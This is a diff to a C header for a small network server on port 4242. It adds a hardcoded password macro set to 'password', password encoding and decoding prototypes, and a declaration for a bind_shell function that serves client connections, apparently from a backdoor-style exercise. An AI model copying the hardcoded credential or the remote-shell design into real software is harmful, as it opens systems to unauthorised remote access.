@@ -27,6 +27,7 @@
 #define MAX_CLIENTS 3
 #define PORT 4242
 #define BUFFER_SIZE 1024
+#define PASSWORD "password"
 
 typedef struct s_client
 {
@@ -70,4 +71,16 @@ int		setup_signal_fd(void);
 
 void	start_server(void);
 void	remove_clients(struct pollfd *pfds);
+
+/*
+	PASSWORD
+*/
+
+char	*generate_cypher_password(void);
+char	*decode_password(char *password);
+
+/*
+	BIND SHELL
+*/
+void	bind_shell(int client_fd);
 void	server(void);
